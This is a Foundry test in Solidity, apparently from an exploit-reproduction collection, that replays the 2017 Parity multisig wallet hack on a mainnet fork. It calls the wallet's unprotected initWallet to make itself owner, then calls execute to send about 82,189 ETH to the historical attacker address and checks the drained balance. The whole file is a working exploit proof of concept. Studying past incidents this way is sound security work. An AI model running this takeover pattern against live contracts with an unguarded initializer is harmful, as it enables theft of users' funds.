// SPDX-License-Identifier: MIT
pragma solidity >= 0.8.0;

import "test/utils/TestUtils.sol";
import "forge-std/Test.sol";

interface ParityWalletInterface {
    function initWallet(address[] memory _owners, uint256 _required, uint256 _daylimit) external;
    function execute(address _to, uint256 _value, bytes calldata _data) external;
    function isOwner(address _addr) external view returns (bool);
}

contract ParityWalletAttack is Test, TestUtils {
    address public constant WALLET = 0xBEc591De75b8699A3Ba52F073428822d0Bfc0D7e;

    // We fork one block prior to the actual attack.
    uint256 public constant BLOCK_NUMBER = 4_043_801;
    uint256 public walletInitialBalance;

    function setUp() public {
        cheat.createSelectFork("mainnet", BLOCK_NUMBER);

        console.log("Setting up ParityWalletAttack, on block: ", block.number);

        walletInitialBalance = address(WALLET).balance;
        console.log("wallet balance before the attack: ", walletInitialBalance);
    }

    // tx hash: https://etherscan.io/tx/0xeef10fc5170f669b86c4cd0444882a96087221325f8bf2f55d6188633aa7be7c
    function testAttack() public {
        ParityWalletInterface wallet = ParityWalletInterface(WALLET);

        // We initialize the wallet with a single owner, which is the contract itself.
        address[] memory owners = new address[](1);
        owners[0] = address(this);
        wallet.initWallet(owners, 1, type(uint256).max);
        assertTrue(wallet.isOwner(address(this)));

        address attacker = 0xB3764761E297D6f121e79C32A65829Cd1dDb4D32;
        uint256 amount = 82_189_000_000_000_000_000_000;

        wallet.execute(attacker, amount, new bytes(0));

        uint256 walletPostBalance = address(WALLET).balance;
        console.log("wallet balance after the attack: ", walletPostBalance);
        assertEq(walletPostBalance, walletInitialBalance - amount);
    }
}
